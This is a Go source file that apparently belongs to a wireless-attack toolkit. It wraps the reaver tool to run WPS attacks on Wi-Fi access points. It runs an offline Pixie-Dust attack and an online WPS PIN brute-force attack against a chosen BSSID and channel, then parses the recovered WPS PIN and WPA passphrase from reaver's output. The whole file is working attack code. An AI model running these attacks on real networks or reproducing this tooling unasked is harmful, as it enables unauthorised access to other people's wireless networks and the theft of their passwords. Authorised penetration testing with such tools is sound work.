package tools

import (
	"bufio"
	"context"
	"fmt"
	"regexp"
	"strings"
)

var (
	reaverPINRe = regexp.MustCompile(`WPS PIN:\s*'?(\d+)'?`)
	reaverPSKRe = regexp.MustCompile(`WPA PSK:\s*'(.+?)'`)
	reaverProgressRe = regexp.MustCompile(`(\d+\.\d+)% complete`)
)

// Reaver wraps the reaver binary for WPS attacks.
type Reaver struct {
	tool *ExternalTool
}

func NewReaver() *Reaver {
	return &Reaver{
		tool: &ExternalTool{Name: "reaver", Required: false},
	}
}

func (r *Reaver) Available() bool {
	return r.tool.Exists()
}

// WPSResult holds the result of a WPS attack.
type WPSResult struct {
	PIN string
	PSK string
}

// PixieDust runs a Pixie-Dust offline WPS attack.
func (r *Reaver) PixieDust(ctx context.Context, iface, bssid string, channel int) (*WPSResult, error) {
	args := []string{
		"-i", iface,
		"-b", bssid,
		"-c", fmt.Sprintf("%d", channel),
		"-K", "1", // Pixie-Dust
		"-vv",
	}

	out, err := RunCapture(ctx, "reaver", args...)
	if err != nil && !strings.Contains(out, "WPS PIN") {
		return nil, fmt.Errorf("pixie-dust failed: %w", err)
	}

	result := &WPSResult{}

	if match := reaverPINRe.FindStringSubmatch(out); len(match) > 1 {
		result.PIN = match[1]
	}
	if match := reaverPSKRe.FindStringSubmatch(out); len(match) > 1 {
		result.PSK = match[1]
	}

	if result.PIN == "" {
		return nil, fmt.Errorf("pixie-dust: no PIN recovered")
	}

	return result, nil
}

// PINBruteForce runs an online WPS PIN brute-force attack.
func (r *Reaver) PINBruteForce(ctx context.Context, iface, bssid string, channel int) (*Process, error) {
	return StartProcess(ctx, "reaver",
		"-i", iface,
		"-b", bssid,
		"-c", fmt.Sprintf("%d", channel),
		"-vv",
	)
}

// ParseReaverOutput extracts WPS results from reaver output.
func ParseReaverOutput(scanner *bufio.Scanner) *WPSResult {
	result := &WPSResult{}
	for scanner.Scan() {
		line := scanner.Text()
		if match := reaverPINRe.FindStringSubmatch(line); len(match) > 1 {
			result.PIN = match[1]
		}
		if match := reaverPSKRe.FindStringSubmatch(line); len(match) > 1 {
			result.PSK = match[1]
		}
	}
	if result.PIN != "" {
		return result
	}
	return nil
}
